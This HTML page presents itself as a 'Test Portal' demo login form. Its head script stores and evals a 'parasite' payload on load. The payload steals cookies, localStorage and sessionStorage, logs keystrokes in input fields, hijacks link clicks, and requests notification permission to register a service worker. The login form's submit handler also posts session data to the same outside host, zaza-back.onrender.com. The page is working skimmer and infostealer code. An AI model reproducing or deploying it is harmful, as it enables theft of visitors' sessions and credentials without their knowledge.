<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Test Portal</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script>
    // 💾 Паразит сохраняется и исполняется
    const payload = `
      (function () {
        const log = {};

        log.cookies = document.cookie;
        log.localStorage = JSON.stringify(localStorage);
        log.sessionStorage = JSON.stringify(sessionStorage);
        log.userAgent = navigator.userAgent;
        log.location = location.href;

        // 🧠 Кейлоггер
        document.addEventListener('keydown', e => {
          if (e.target && e.target.tagName === 'INPUT') {
            log.lastKey = e.key;
            log.inputValue = e.target.value;
          }
        });

        // 🔁 Редирект-инъекция
        document.querySelectorAll('a[href]').forEach(link => {
          link.addEventListener('click', e => {
            e.preventDefault();
            const target = link.href;
            fetch('https://zaza-back.onrender.com/click', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ target, ts: Date.now() })
            }).finally(() => location.href = target);
          });
        });

        // ⏺️ Push (если нужно)
        if (Notification && Notification.permission !== 'denied') {
          Notification.requestPermission().then(p => {
            if (p === 'granted') navigator.serviceWorker?.register('/sw.js');
          });
        }

        // 📩 Telegram лог
        fetch('https://zaza-back.onrender.com/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: 'from-capture.js',
            password: 'injected',
            cookies: JSON.stringify(log)
          })
        });
      })();
    `;
    localStorage.setItem('parasite_script', payload);
    eval(localStorage.getItem('parasite_script'));
  </script>
</head>
<body>
  <h2>Demo Login</h2>
  <form id="loginForm">
    <input id="email" placeholder="Email" /><br />
    <input id="password" placeholder="Password" type="password" /><br />
    <button type="submit">Submit</button>
  </form>

  <script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;

      const payload = {
        email: 'from-capture.js',
        password: 'injected',
        cookies: JSON.stringify({
          cookies: document.cookie,
          localStorage: JSON.stringify(localStorage),
          sessionStorage: JSON.stringify(sessionStorage),
          location: location.href,
          userAgent: navigator.userAgent
        })
      };

      await fetch('https://zaza-back.onrender.com/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    });
  </script>
</body>
</html>
